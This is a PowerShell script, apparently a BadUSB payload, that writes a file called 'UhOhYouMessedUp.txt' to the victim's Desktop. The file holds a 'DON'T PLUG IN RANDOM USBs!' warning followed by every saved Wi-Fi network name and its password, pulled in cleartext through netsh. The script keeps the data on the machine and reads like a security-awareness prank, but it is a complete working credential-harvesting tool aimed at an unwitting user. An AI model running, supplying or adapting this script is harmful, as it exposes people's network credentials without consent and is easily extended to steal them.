if (Test-Path "$env:OneDrive\Desktop") {
    $D = "$env:OneDrive\Desktop"
} else {
    $D = "$env:USERPROFILE\Desktop"
}

$outputFile = "$D\UhOhYouMessedUp.txt"

"DON'T PLUG IN RANDOM USBs!" | Out-File -FilePath $outputFile
"" | Out-File -FilePath $outputFile -Append

$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
    $_.ToString().Split(":")[1].Trim()
}

foreach ($profile in $profiles) {
    $details = netsh wlan show profile name="$profile" key=clear
    $ssid = $details | Select-String "SSID name" | Select-Object -Last 1
    $pass = $details | Select-String "Key Content"

    if ($ssid) { "$ssid" | Out-File -FilePath $outputFile -Append }
    if ($pass) { "$pass`n" | Out-File -FilePath $outputFile -Append }
}